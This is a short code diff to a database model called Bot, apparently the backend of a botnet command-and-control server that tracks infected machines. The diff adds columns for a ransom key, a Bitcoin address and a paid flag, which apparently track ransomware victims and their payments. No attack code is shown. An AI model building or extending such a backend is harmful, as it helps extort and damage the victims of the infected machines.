@@ -13,6 +13,9 @@ class Bot(db.Model):
 	os = db.Column(db.String(150))
 	last_ping = db.Column(db.DateTime())
 	output = db.Column(db.Text(), default="")
+	ransom_key = db.Column(db.String(100))
+	btc_addr = db.Column(db.String(100))
+	paid = db.Column(db.Boolean())
 	def __init__(self, uid):
 		self.id = uid
 
